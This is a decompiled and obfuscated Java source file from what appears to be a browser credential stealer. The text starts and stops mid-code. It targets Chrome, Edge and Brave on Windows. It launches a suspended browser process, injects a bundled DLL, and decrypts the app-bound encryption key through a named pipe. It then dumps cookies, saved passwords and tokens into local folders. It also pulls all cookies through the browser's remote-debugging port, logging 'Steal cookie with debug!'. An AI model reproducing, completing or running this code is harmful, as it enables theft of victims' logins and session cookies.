                        new StringBuilder().append("--profile-directory=").append(var2).toString()
                     }).redirectErrorStream(true).start();
         }

         bdrwmt(9222, var4);
      } catch (Exception var6) {
         var6.printStackTrace();
      }
   }

   public static void bdrwmt(int var0, String var1) throws InterruptedException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      while (true) {
         try {
            Socket var2 = new java.net.Socket("localhost", var0);

            try {
               System.out.println("Steal cookie with debug!");
            } catch (Throwable var6) {
               try {
                  var2.close();
               } catch (Throwable var5) {
                  var6.addSuppressed(var5);
               }

               throw var6;
            }

            var2.close();
            return;
         } catch (IOException var7) {
            Thread.sleep(200);
            System.out.println(new StringBuilder().append("Bruh cant load ").append(var1).toString());
         }
      }
   }

   private static String bitnvi(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      HttpURLConnection var1 = null;

      try {
         URL var2 = new URL(var0);
         var1 = (HttpURLConnection)var2.openConnection();
         var1.setRequestMethod("GET");
         var1.setRequestProperty("User-Agent", "Mozilla/5.0");
         int var3 = var1.getResponseCode();
         if (var3 != 200) {
            return "";
         }

         BufferedReader var4 = new java.io.BufferedReader(new java.io.InputStreamReader(var1.getInputStream()));
         StringBuilder var5 = new StringBuilder();

         while (true) {
            String var6 = var4.readLine();
            if (var6 != null) {
               var5.append(var6);
            } else {
               var4.close();

               try {
                  JsonArray var7 = new JsonParser()
                     .parse(
                        var5.toString()
                     )
                     .getAsJsonArray();
                  Iterator var8 = var7.iterator();

                  while (var8.hasNext()) {
                     JsonElement var9 = (JsonElement)var8.next();
                     JsonObject var10 = var9.getAsJsonObject();
                     String var11 = var10.get("url").getAsString();
                     if (var11.startsWith("http")) {
                        return var10.get("webSocketDebuggerUrl").getAsString();
                     }
                  }

                  JsonObject var16 = var7.get(0).getAsJsonObject();
                  return var16.get("webSocketDebuggerUrl").getAsString().trim();
               } catch (JSONException var12) {
                  var12.printStackTrace();
               } catch (Exception var13) {
                  var13.printStackTrace();
               }
            }
         }
      } catch (Exception var14) {
         var14.printStackTrace();
         return "";
      }
   }

   public void slkuwa(String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         ClientManager var2 = ClientManager.createClient();

         try {
            var2.connectToServer(
               this,
               new java.net.URI(var1)
            );
         } catch (Exception var4) {
            System.err.println(new StringBuilder().append("Failed to connect to server: ").append(var4.getMessage()).toString());
            var4.printStackTrace();
         }
      } catch (Exception var5) {
         var5.printStackTrace();
      }
   }

   @OnOpen
   public void bofxsd(Session var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      this.scooter = var1;
   }

   @OnMessage
   public void tgvosb(String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      JsonObject var2 = (JsonObject)bronze.fromJson(var1, JsonObject.class);
      if (var2.has("result")
         && var2.getAsJsonObject("result")
            .has("cookies")) {
         if (var2.has("id")) {
            int var3 = var2.get("id").getAsInt();
            this.prism.put(Integer.valueOf(var3), "message");
         }

         JsonArray var18 = var2.getAsJsonObject("result")
            .getAsJsonArray("cookies");
         StringBuilder var4 = new StringBuilder();
         Iterator var5 = var18.iterator();

         while (var5.hasNext()) {
            JsonElement var6 = (JsonElement)var5.next();
            JsonObject var7 = var6.getAsJsonObject();
            String var8 = var7.has("domain")
               ? var7.get("domain").getAsString()
               : "";
            String var9 = var7.has("secure")
                  && var7.get("secure").getAsBoolean()
               ? "TRUE"
               : "FALSE";
            String var10 = var7.has("path")
               ? var7.get("path").getAsString()
               : "/";
            String var11 = var7.has("httpOnly")
                  && var7.get("httpOnly").getAsBoolean()
               ? "TRUE"
               : "FALSE";
            String var12 = var7.has("expires")
               ? var7.get("expires").getAsString()
               : "N/A";
            String var13 = var7.has("name")
               ? var7.get("name").getAsString()
               : "";
            String var14 = var7.has("value")
               ? var7.get("value").getAsString()
               : "";
            var4.append(String.format("%s\t%s\t%s\t%s\t%s\t%s\t%s%n", new Object[]{var8, var9, var10, var11, var12, var13, var14}));
         }

         if (var4 != null) {
            try {
               BufferedWriter var21 = new java.io.BufferedWriter(new java.io.FileWriter(orange));

               try {
                  System.out.println(new StringBuilder().append("Saving cookies to ").append(orange).toString());
                  var21.write(var4.toString());
               } catch (Throwable var16) {
                  try {
                     var21.close();
                  } catch (Throwable var15) {
                     var16.addSuppressed(var15);
                  }

                  throw var16;
               }

               var21.close();
            } catch (IOException var17) {
               var17.printStackTrace();
            }
         }
      }

      if (var2.has("error")
         && var2.getAsJsonObject("error").has("code")) {
         JsonObject var19 = var2.getAsJsonObject("error");
         int var20 = var19.get("code").getAsInt();
         System.out.println(var19);
         if (var20 == -32000) {
            System.out.println("Error maybe with yandex (idk how it fix)");
         }
      }
   }

   public void gjigvk(String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (this.scooter != null && this.scooter.isOpen()) {
         this.scooter.getAsyncRemote().sendText(var1);
      }
   }

   public void close() throws Exception {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (this.scooter != null) {
         this.scooter.close();
      }
   }

   public static void nnjyzh(String var0, String var1) throws Exception {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (!var1.isEmpty()) {
         orange = var1;
      }

      obsidian = var0;
      prawn var2 = new prawn();

      try {
         var2.slkuwa(var0);

         while (!var2.vuramn()) {
            Thread.sleep(100);
         }

         JsonObject var3 = new JsonObject();
         var3.addProperty(
            "id",
            Integer.valueOf(1)
         );
         var3.addProperty(
            "method",
            "Network.getAllCookies"
         );
         var2.gjigvk(bronze.toJson(var3));
         String var4 = var2.naotcj(1, 5000);
      } finally {
         var2.close();
      }
   }

   public boolean vuramn() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      return this.scooter != null && this.scooter.isOpen();
   }

   public String naotcj(int var1, long var2) throws InterruptedException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      long var4 = System.currentTimeMillis();

      while (System.currentTimeMillis() - var4 < var2) {
         if (this.prism.containsKey(Integer.valueOf(var1))) {
            return (String)this.prism.remove(Integer.valueOf(var1));
         }

         Thread.sleep(100);
      }

      return null;
   }

   public static void lxjtuk() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (silo) {
         cradle.persimmon();
         cradle.iris();
         cradle.knight();
         cradle.coral();

         try {
            System.out.println("[main] Waiting for DLL");
            String var0 = System.getenv("LOCALAPPDATA");
            ArrayList var1 = new java.util.ArrayList();
            if (stingray && millet) {
               var1.add(new kangaroo(
                     "Chrome",
                     new java.util.ArrayList(java.util.Arrays.asList(new String[]{
                              "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                              "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
                              java.nio.file.Paths.get(var0, new String[]{
                                       "Google",
                                       "Chrome",
                                       "Application",
                                       "chrome.exe"
                                    }).toString()
                           })),
                     java.nio.file.Paths.get(var0, new String[]{
                              "Google",
                              "Chrome",
                              "User Data"
                           }).toString(),
                     "chrome"
                  ));
            }

            if (parchment && dagger) {
               var1.add(new kangaroo(
                     "Edge",
                     new java.util.ArrayList(java.util.Arrays.asList(new String[]{
                              "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
                              "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                              java.nio.file.Paths.get(var0, new String[]{
                                       "Microsoft",
                                       "Edge",
                                       "Application",
                                       "msedge.exe"
                                    }).toString()
                           })),
                     java.nio.file.Paths.get(var0, new String[]{
                              "Microsoft",
                              "Edge",
                              "User Data"
                           }).toString(),
                     "msedge"
                  ));
            }

            if (stucco && lemon) {
               var1.add(new kangaroo(
                     "Brave",
                     new java.util.ArrayList(java.util.Arrays.asList(new String[]{
                              "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
                              "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
                              java.nio.file.Paths.get(var0, new String[]{
                                       "BraveSoftware",
                                       "Brave-Browser",
                                       "Application",
                                       "brave.exe"
                                    }).toString()
                           })),
                     java.nio.file.Paths.get(var0, new String[]{
                              "BraveSoftware",
                              "Brave-Browser",
                              "User Data"
                           }).toString(),
                     "brave"
                  ));
            }

            ExecutorService var2 = java.util.concurrent.Executors.newSingleThreadExecutor();
            Iterator var3 = var1.iterator();

            while (var3.hasNext()) {
               kangaroo var4 = (kangaroo)var3.next();
               String var5 = opkfxl(var4.oyster);
               if (var5 == null) {
                  System.out.println(new StringBuilder().append("[main] Skipping ").append(var4.lever).append(": application not found").toString());
               } else if (!java.nio.file.Files.isDirectory(java.nio.file.Paths.get(var4.leopard, new String[0]), new LinkOption[0])) {
                  System.out.println(new StringBuilder().append("[main] Skipping ").append(var4.lever).append(": data path not found").toString());
               } else if (!vbuxsp(var4.leopard)) {
                  System.out.println(new StringBuilder().append("[main] Skipping ").append(var4.lever).append(": no app-bound key (DPAPI path handles it)").toString());
               } else {
                  AtomicReference var6 = new java.util.concurrent.atomic.AtomicReference();
                  AtomicReference var7 = new java.util.concurrent.atomic.AtomicReference();
                  AtomicInteger var8 = new AtomicInteger(0);
                  Callable var9 = () -> {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     try {
                        System.out.println(new StringBuilder().append("[phase] Browser=").append(var4.lever).append(", appPath=").append(var5).toString());
                        System.out.println(new StringBuilder().append("[phase] dataPath=").append(var4.leopard).toString());
                        long var5x = System.currentTimeMillis();
                        System.out.println(new StringBuilder().append("[main] Launching suspended process for ").append(var4.lever).append(" (30s timeout)...").toString());

                        try {
                           File var7x = new File(var5).getParentFile();
                           File[] var8x = var7x.listFiles(new FileFilter() {
                                 @Override
                                 public boolean accept(File var1) {
                                    if (rkjsezrwcf.jzdety() != 0) {
                                       rkjsezrwcf.bbsnvj();
                                    }

                                    return var1.isDirectory()
                                       && var1.getName().matches("\\d+\\.\\d+\\.\\d+\\.\\d+");
                                 }
                              });
                           if (var8x != null && var8x.length != 0) {
                              java.util.Arrays.sort(var8x, new Comparator<File>() {
                                    public int compare(File var1, File var2x) {
                                       if (rkjsezrwcf.jzdety() != 0) {
                                          rkjsezrwcf.bbsnvj();
                                       }

                                       return var2x.getName().compareTo(var1.getName());
                                    }
                                 });
                              System.out.println(new StringBuilder().append(var4.lever).append(" version: ").append(var8x[0].getName()).toString());
                           } else {
                              System.out.println("Chrome version not found");
                           }
                        } catch (Exception var59) {
                           var59.printStackTrace();
                        }

                        ExecutorService var61 = java.util.concurrent.Executors.newSingleThreadExecutor();
                        Future var62 = var61.submit(() -> {
                              if (rkjsezrwcf.jzdety() != 0) {
                                 rkjsezrwcf.bbsnvj();
                              }

                              System.out.println(new StringBuilder().append("[launch-thread] started for ").append(var4.lever).toString());
                              System.out.flush();
                              return cradle.desert(
                                 new StringBuilder().append("launchSuspendedProc ").append(var4.lever).toString(),
                                 new Callable<niece>() {
                                    public niece call() throws Exception {
                                       if (rkjsezrwcf.jzdety() != 0) {
                                          rkjsezrwcf.bbsnvj();
                                       }

                                       return blossom.pshkch(var1);
                                    }
                                 }
                              );
                           });
                        boolean var50 = false /* VF: Semaphore variable */;

                        final niece var9x;
                        try {
                           var50 = true;
                           var9x = (niece)var62.get(30, java.util.concurrent.TimeUnit.SECONDS);
                           var50 = false;
                        } catch (TimeoutException var56) {
                           var62.cancel(true);
                           System.out.println(new StringBuilder().append("[error] launchSuspendedProc timeout after 30000 ms for ").append(var4.lever).append(", appPath=").append(var5).toString());
                           throw new java.lang.RuntimeException("launch timeout");
                        } finally {
                           if (var50) {
                              var61.shutdownNow();
                           }
                        }

                        var61.shutdownNow();
                        var8.set(var9x.spruce);
                        var6.set(var9x.beetle);
                        System.out.println(new StringBuilder().append("[main] Process launched, pid=").append(var9x.spruce).append(" (").append(System.currentTimeMillis()
                                       - var5x).append(" ms)").toString());
                        long var10x = System.currentTimeMillis();
                        final String var12 = new StringBuilder().append("\\\\.\\pipe\\").append(abnptk(var9x.spruce)).toString();
                        System.out.println(new StringBuilder().append("[main] Pipe name = ").append(var12).toString());
                        final coyote var13x = cradle.desert(
                           new StringBuilder().append("setupPipe ").append(var4.lever).toString(),
                           new Callable<coyote>() {
                              public coyote call() throws Exception {
                                 if (rkjsezrwcf.jzdety() != 0) {
                                    rkjsezrwcf.bbsnvj();
                                 }

                                 return prawn.fitqce(var12);
                              }
                           }
                        );
                        var7.set(var13x);
                        System.out.println(new StringBuilder().append("[main] Pipe created (").append(System.currentTimeMillis()
                                       - var10x).append(" ms)").toString());
                        long var14x = System.currentTimeMillis();
                        final medal var16x = cugrnc();
                        System.out.println(new StringBuilder().append("[main] DLL temp path len=").append(var16x.chalk).append(" (").append(System.currentTimeMillis()
                                       - var14x).append(" ms)").toString());
                        long var17 = System.currentTimeMillis();
                        System.out.println("[main] Injecting DLL...");
                        RuntimeException var19 = null;

                        for (int var20 = 1; var20 <= 3; var20++) {
                           try {
                              cradle.jaguar(
                                 new StringBuilder().append("injectDll ").append(var4.lever).append(" #").append(var20).toString(),
                                 new Runnable() {
                                    @Override
                                    public void run() {
                                       if (rkjsezrwcf.jzdety() != 0) {
                                          rkjsezrwcf.bbsnvj();
                                       }

                                       prawn.ialxwc(var9x.beetle, var16x.diesel, var16x.chalk);
                                    }
                                 }
                              );
                              var19 = null;
                              break;
                           } catch (RuntimeException var58) {
                              var19 = var58;
                              System.out.println(new StringBuilder().append("[main] injection attempt ").append(var20).append(" failed: ").append(var58.getMessage()).toString());
                              if (var20 < 3) {
                                 try {
                                    Thread.sleep(800);
                                 } catch (InterruptedException var55) {
                                 }
                              }
                           }
                        }

                        if (var19 != null) {
                           throw var19;
                        }

                        System.out.println(new StringBuilder().append("[main] DLL injected (").append(System.currentTimeMillis()
                                       - var17).append(" ms)").toString());
                        long var63 = System.currentTimeMillis();
                        System.out.println("[main] Reading encrypted key from Local State...");
                        final byte[] var22 = hrodeg(var4.leopard);
                        System.out.println(new StringBuilder().append("[main] Encrypted key length=").append(var22.length).append(" (").append(System.currentTimeMillis()
                                       - var63).append(" ms)").toString());
                        System.out.println("[main] Decrypting key via named pipe (timeout 8s)...");
                        ExecutorService var23 = java.util.concurrent.Executors.newSingleThreadExecutor();
                        Future var24 = var23.submit(new Callable<String>() {
                              public String call() throws Exception {
                                 if (rkjsezrwcf.jzdety() != 0) {
                                    rkjsezrwcf.bbsnvj();
                                 }

                                 return cradle.desert(
                                    new StringBuilder().append("decryptKey ").append(var0.lever).toString(),
                                    new Callable<String>() {
                                       public String call() throws Exception {
                                          if (rkjsezrwcf.jzdety() != 0) {
                                             rkjsezrwcf.bbsnvj();
                                          }

                                          return prawn.qfxdpb(var13x, var22);
                                       }
                                    }
                                 );
                              }
                           });
                        boolean var39 = false /* VF: Semaphore variable */;

                        String var25;
                        try {
                           var39 = true;
                           var25 = (String)var24.get(8, java.util.concurrent.TimeUnit.SECONDS);
                           var39 = false;
                        } catch (TimeoutException var53) {
                           var24.cancel(true);
                           System.out.println(new StringBuilder().append("[error] decryptKey timeout after 8000 ms for ").append(var4.lever).toString());
                           throw new java.lang.RuntimeException("decryptKey timeout");
                        } finally {
                           if (var39) {
                              var23.shutdownNow();
                           }
                        }

                        var23.shutdownNow();
                        byte[] var26 = owffek(var25);
                        System.out.println(new StringBuilder().append("[main] Decrypted Key: ").append(var25).toString());
                        System.out.println("[main] Cleaning up handles...");
                        wpjyho(var9x.beetle, var13x);
                        System.out.println(new StringBuilder().append("[main] Done for ").append(var4.lever).append(".").toString());
                        long var27 = System.currentTimeMillis();
                        System.out.println("[main] Processing cookies for profiles...");
                        homcdo(var4.leopard, var4.lever, var4.marble, var26);
                        System.out.println(new StringBuilder().append("[main] Cookies processed (").append(System.currentTimeMillis()
                                       - var27).append(" ms)").toString());
                     } catch (Exception var60) {
                        var60.printStackTrace();
                        System.out.println(new StringBuilder().append("[main] Error while processing ").append(var4.lever).append(": ").append(var60.getMessage()).toString());
                        if (var6.get()
                              != null
                           && var7.get()
                              != null) {
                           try {
                              wpjyho(
                                 (coyote)var6.get(),
                                 (coyote)var7.get()
                              );
                           } catch (Exception var52) {
                           }
                        } else if (var6.get()
                           != null) {
                           try {
                              flower.INSTANCE
                                 .CloseHandle(
                                    (coyote)var6.get()
                                 );
                           } catch (Exception var51) {
                           }
                        }
                     }

                     return null;
                  };
                  Future var10 = var2.submit(var9);

                  try {
                     var10.get(32, java.util.concurrent.TimeUnit.SECONDS);
                  } catch (TimeoutException var14) {
                     System.out.println(new StringBuilder().append("[main] Timeout: aborting processing for ").append(var4.lever).append(" after 32s").toString());
                     var10.cancel(true);
                     if (var6.get()
                        != null) {
                        try {
                           wpjyho(
                              (coyote)var6.get(),
                              (coyote)var7.get()
                           );
                        } catch (Exception var13) {
                        }
                     }
                  } catch (Exception var15) {
                     System.out.println(new StringBuilder().append("[main] Failed: ").append(var15.getMessage()).toString());
                     var15.printStackTrace(System.out);
                  }
               }
            }

            var2.shutdownNow();
         } catch (Exception var16) {
            var16.printStackTrace();
         }
      }
   }

   public static String opkfxl(List<String> var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Iterator var1 = var0.iterator();

      while (var1.hasNext()) {
         String var2 = (String)var1.next();

         try {
            if (var2 != null
               && java.nio.file.Files.exists(java.nio.file.Paths.get(var2, new String[0]), new LinkOption[0])) {
               return var2;
            }
         } catch (Exception var4) {
         }
      }

      return null;
   }

   public static long nprgqb(long var0, int var2) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      return (var0 << var2 | var0 >>> 32 - var2) & 4294967295L;
   }

   public static String abnptk(int var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      long var1 = 2779096485L;
      long var3 = 15470 << 16 | (char)-3214;
      long var5 = 7157 << 16 | (char)-22559;
      long var7 = 2654435769L;
      long var9 = nprgqb(var0 ^ var1, 5);
      long var11 = nprgqb(var0 ^ var3, 11);
      long var13 = nprgqb(var0 ^ var5, 17);
      long var15 = nprgqb(var0 ^ var7, 23);
      return String.format("%08X%08X%08X%08X", new Object[]{
            Long.valueOf(var9),
            Long.valueOf(var11),
            Long.valueOf(var13),
            Long.valueOf(var15)
         });
   }

   public static coyote fitqce(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      byte var1 = 3;
      byte var2 = 0;
      byte var3 = 0;
      byte var4 = 0;
      System.out.println(new StringBuilder().append("[setupPipe] Creating named pipe: ").append(var0).toString());
      coyote var5 = flower.INSTANCE.CreateNamedPipeW(new WString(var0), var1, var2 | var3 | var4, 1, 1 << 16 | (char)0, 1 << 16 | (char)0, 0, null);
      if (var5 != null && Pointer.nativeValue(var5.getPointer()) != -1) {
         System.out.println(new StringBuilder().append("[setupPipe] Pipe handle=").append(Pointer.nativeValue(var5.getPointer())).toString());
         return var5;
      } else {
         int var6 = Native.getLastError();
         System.out.println(new StringBuilder().append("[setupPipe] CreateNamedPipeW failed, lastError=").append(var6).toString());
         throw new java.lang.RuntimeException(new StringBuilder().append("CreateNamedPipe failed: ").append(var6).toString());
      }
   }

   static String dkmigm(medal var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      int var1 = var0.chalk;

      while (var1 >= 2 && var0.diesel[var1 - 1] == 0 && var0.diesel[var1 - 2] == 0) {
         var1 -= 2;
      }

      return new String(var0.diesel, 0, var1, java.nio.charset.StandardCharsets.UTF_16LE);
   }

   static void bchokt(Class<?> var0) throws Exception {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      CodeSource var1 = var0.getProtectionDomain().getCodeSource();
      if (var1 == null) {
         System.out.println("CodeSource is null");
      } else {
         URI var2 = var1.getLocation().toURI();
         Path var3 = java.nio.file.Paths.get(var2);
         if (java.nio.file.Files.isDirectory(var3, new LinkOption[0])) {
            DirectoryStream var4 = java.nio.file.Files.newDirectoryStream(var3);

            try {
               Iterator var5 = var4.iterator();

               while (var5.hasNext()) {
                  Path var6 = (Path)var5.next();
                  if (java.nio.file.Files.isRegularFile(var6, new LinkOption[0])) {
                     System.out.println(var6.getFileName().toString());
                  }
               }
            } catch (Throwable var10) {
               if (var4 != null) {
                  try {
                     var4.close();
                  } catch (Throwable var8) {
                     var10.addSuppressed(var8);
                  }
               }

               throw var10;
            }

            if (var4 != null) {
               var4.close();
            }
         } else if (var3.toString().endsWith(".jar")) {
            JarFile var11 = new java.util.jar.JarFile(var3.toFile());

            try {
               Stream var10000 = var11.stream().filter(var0x -> {
                           if (rkjsezrwcf.jzdety() != 0) {
                              rkjsezrwcf.bbsnvj();
                           }

                           return !var0x.isDirectory();
                        }).map(ZipEntry::getName).filter(var0x -> {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     return !var0x.contains("/");
                  });
               PrintStream var10001 = System.out;
               java.util.Objects.requireNonNull(var10001);
               var10000.forEach(var10001::println);
            } catch (Throwable var9) {
               try {
                  var11.close();
               } catch (Throwable var7) {
                  var9.addSuppressed(var7);
               }

               throw var9;
            }

            var11.close();
         } else {
            System.out.println(new StringBuilder().append("Unknown code source: ").append(var3).toString());
         }
      }
   }

   public static medal cugrnc() throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         InputStream var0 = prawn.class.getResourceAsStream("/CookiveV2.dll");

         medal var9;
         try {
            if (var0 == null) {
               bchokt(prawn.class);
               throw new java.io.FileNotFoundException("DLL not found in resources");
            }

            ByteArrayOutputStream var1 = new java.io.ByteArrayOutputStream();
            byte[] var2 = new byte[4096];

            int var3;
            while ((var3 = var0.read(var2)) != -1) {
               var1.write(var2, 0, var3);
            }

            byte[] var4 = var1.toByteArray();
            File var5 = File.createTempFile("moddll", ".dll");
            var5.deleteOnExit();
            java.nio.file.Files.write(var5.toPath(), var4, new OpenOption[0]);
            String var6 = var5.getAbsolutePath();
            byte[] var7 = var6.getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
            byte[] var8 = java.util.Arrays.copyOf(var7, var7.length + 2);
            var9 = new medal(var8, var8.length);
         } catch (Throwable var11) {
            if (var0 != null) {
               try {
                  var0.close();
               } catch (Throwable var10) {
                  var11.addSuppressed(var10);
               }
            }

            throw var11;
         }

         if (var0 != null) {
            var0.close();
         }

         return var9;
      } catch (Exception var12) {
         throw new java.lang.RuntimeException(var12);
      }
   }

   public static void ialxwc(coyote var0, byte[] var1, int var2) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      postbox var3 = blossom.ysllak(var0, var1, var2);
      if (var3.vaeyet == 0L) {
         throw new java.lang.RuntimeException(new StringBuilder().append("LoadLibraryW failed in remote process, lastError=").append(var3.biskev).toString());
      }
   }

   public static byte[] hrodeg(String var0) throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Path var1 = java.nio.file.Paths.get(var0, new String[]{"Local State"});
      JSONObject var2 = new JSONObject(
         new String(java.nio.file.Files.readAllBytes(var1), java.nio.charset.StandardCharsets.UTF_8)
      );
      String var3 = var2.getJSONObject("os_crypt")
         .getString(
            "app_bound_encrypted_key"
         );
      byte[] var4 = java.util.Base64.getDecoder().decode(var3);
      return java.util.Arrays.copyOfRange(var4, 4, var4.length);
   }

   public static String qfxdpb(coyote var0, byte[] var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      System.out.println("[decryptKey] Waiting for client: ConnectNamedPipe...");
      boolean var2 = flower.INSTANCE.ConnectNamedPipe(var0, Pointer.NULL);
      int var3 = Native.getLastError();
      if (!var2 && var3 == 535) {
         System.out.println("[decryptKey] Client already connected (ERROR_PIPE_CONNECTED), proceeding.");
         var2 = true;
      }

      System.out.println(new StringBuilder().append("[decryptKey] ConnectNamedPipe ret=").append(var2).append(", lastError=").append(var3).toString());
      byte[] var4 = java.nio.ByteBuffer.allocate(4).order(java.nio.ByteOrder.LITTLE_ENDIAN).putInt(var1.length).array();
      byte[] var5 = new byte[var4.length + var1.length];
      System.arraycopy(var4, 0, var5, 0, 4);
      System.arraycopy(var1, 0, var5, 4, var1.length);
      IntByReference var6 = new IntByReference();
      boolean var7 = flower.INSTANCE.WriteFile(var0, var5, var5.length, var6, Pointer.NULL);
      System.out.println(new StringBuilder().append("[decryptKey] WriteFile ret=").append(var7).append(", written=").append(var6.getValue()).append(", lastError=").append(Native.getLastError()).toString());
      byte[] var8 = new byte[4096];
      IntByReference var9 = new IntByReference();
      System.out.println("[decryptKey] Reading response via ReadFile...");
      boolean var10 = flower.INSTANCE.ReadFile(var0, var8, var8.length, var9, Pointer.NULL);
      System.out.println(new StringBuilder().append("[decryptKey] ReadFile ret=").append(var10).append(", read=").append(var9.getValue()).append(", lastError=").append(Native.getLastError()).toString());
      String var11 = new String(var8, 0, java.lang.Math.max(0, var9.getValue())).trim();
      System.out.println(new StringBuilder().append("[decryptKey] Response (hex) length=").append(var11.length()).toString());
      return var11;
   }

   public static void wpjyho(coyote var0, coyote var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      flower.INSTANCE.TerminateProcess(var0, 0);
      flower.INSTANCE.CloseHandle(var1);
      flower.INSTANCE.CloseHandle(var0);
   }

   public static byte[] owffek(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      int var1 = var0.length();
      byte[] var2 = new byte[var1 / 2];

      for (int var3 = 0; var3 < var2.length; var3++) {
         var2[var3] = (byte)Integer.parseInt(var0.substring(var3 * 2, var3 * 2 + 2), 16);
      }

      return var2;
   }

   public static void homcdo(String var0, String var1, String var2, byte[] var3) throws Exception {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      System.out.println(new StringBuilder().append("Decrypted Key: ").append(ydzttw(var3)).toString());
      List var4 = ueyyzi(var0);
      File var5 = new File(new StringBuilder().append(lantern).append("\\Cookies").toString());
      if (!var5.exists()) {
         var5.mkdirs();
      }

      File var6 = new File(new StringBuilder().append(lantern).append("\\Passwords").toString());
      if (!var6.exists()) {
         var6.mkdirs();
      }

      Iterator var7 = var4.iterator();

      while (var7.hasNext()) {
         String[] var8 = (String[])var7.next();
         String var9 = var8[0];
         String var10 = var8[1];
         List var11 = uwnkvv(var9, var3, var2);
         if (!var11.isEmpty()) {
            File var12 = new File(var5, new StringBuilder().append(var1).append("_").append(var10).append("_cookies.txt").toString());
            java.nio.file.Files.write(var12.toPath(), var11, java.nio.charset.StandardCharsets.UTF_8, new OpenOption[0]);
            System.out.println(new StringBuilder().append("Wrote ").append(var11.size()).append(" cookies to ").append(var12.getPath()).toString());
         }

         File var18 = new File(new File(var0, var10), "Login Data");
         if (var18.exists()) {
            List var13 = pjxlop(
               var18.getAbsolutePath(),
               var3,
               var2
            );
            if (!var13.isEmpty()) {
               File var14 = new File(var6, new StringBuilder().append(var1).append("_").append(var10).append(".txt").toString());
               java.nio.file.Files.write(var14.toPath(), var13, java.nio.charset.StandardCharsets.UTF_8, new OpenOption[0]);
            }
         }

         File var19 = new File(new File(var0, var10), "Web Data");
         if (var19.exists()) {
            try {
               List var20 = vyhwho(
                  var19.getAbsolutePath(),
                  var3
               );
               if (!var20.isEmpty()) {
                  File var15 = new File(new StringBuilder().append(lantern).append("\\Tokens").toString());
                  if (!var15.exists()) {
                     var15.mkdirs();
                  }

                  File var16 = new File(var15, new StringBuilder().append(var1).append("_").append(var10).append(".txt").toString());
                  java.nio.file.Files.write(var16.toPath(), var20, java.nio.charset.StandardCharsets.UTF_8, new OpenOption[0]);
                  System.out.println(new StringBuilder().append("Wrote ").append(var20.size()).append(" tokens to ").append(var16.getPath()).toString());
               }
            } catch (Exception var17) {
               System.out.println(new StringBuilder().append("[Tokens] fail ").append(var1).append("/").append(var10).append(": ").append(var17.getMessage()).toString());
            }
         }
      }
   }

   public static List<String[]> ueyyzi(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Pattern var1 = java.util.regex.Pattern.compile("^(Default|Profile \\d+)$", 2);
      File var2 = new File(var0);
      ArrayList var3 = new java.util.ArrayList();
      File[] var4 = var2.listFiles();
      if (var4 == null) {
         return var3;
      }

      for (File var8 : var4) {
         if (var8.isDirectory()
            && var1.matcher(var8.getName()).matches()) {
            File var9 = new File(var8, new StringBuilder().append("Network").append(File.separator).append("Cookies").toString());
            if (var9.exists()) {
               var3.add(new String[]{
                     var9.getAbsolutePath(),
                     var8.getName()
                  });
            }
         }
      }

      return var3;
   }

   public static List<String> uwnkvv(String var0, byte[] var1, String var2) throws Exception {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Path var3 = java.nio.file.Files.createTempDirectory("cookies_", new FileAttribute[0]);
      Path var4 = var3.resolve("cookies_copy");
      Path var5 = java.nio.file.Paths.get(var0, new String[0]);

      for (int var6 = 1; var6 <= 5; var6++) {
         try {
            clsatd(var5, var4);
            System.out.println(new StringBuilder().append("[decryptCookies] Copy OK on attempt ").append(var6).toString());
            break;
         } catch (IOException var36) {
